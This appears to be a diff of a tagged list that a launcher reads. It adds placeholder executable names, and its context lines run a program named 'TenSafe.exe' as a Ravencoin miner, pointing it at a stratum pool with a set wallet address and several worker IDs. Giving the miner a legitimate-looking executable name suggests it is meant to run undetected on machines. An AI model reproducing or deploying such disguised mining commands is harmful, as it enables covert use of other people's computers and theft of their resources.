@@ -7,6 +7,13 @@ AA694K.exe6AA
 AA795K.exe7AA
 AA897K.exe8AA
 AA996K.exe9AA
+----------------------------------------------
+YX--MMMMMMM.EXE--YX
+Y1X--MMMMMMM.EXE--Y1X
+Y2X--MMMMMMM.EXE--Y2X
+Y3X--MMMMMMM.EXE--Y3X
+Y4X--MMMMMMM.EXE--Y4X
+Y5X--MMMMMMM.EXE--Y5X
 ------------------------------------------------------------------------------------------------------------------------------------
 A1A--\TenSafe.exe -o stratum+tcp://rvn-pool.beepool.org:9531 -a x16r -u RBBiWq2Fnmy9pLsV9Shwj6ox2wsjNSc25Q.RV13@pplns -i 13 -p x--A1A
 A2A--\TenSafe.exe -o stratum+tcp://rvn-pool.beepool.org:9531 -a x16r -u RBBiWq2Fnmy9pLsV9Shwj6ox2wsjNSc25Q.RV15@pplns -i 15 -p x--A2A
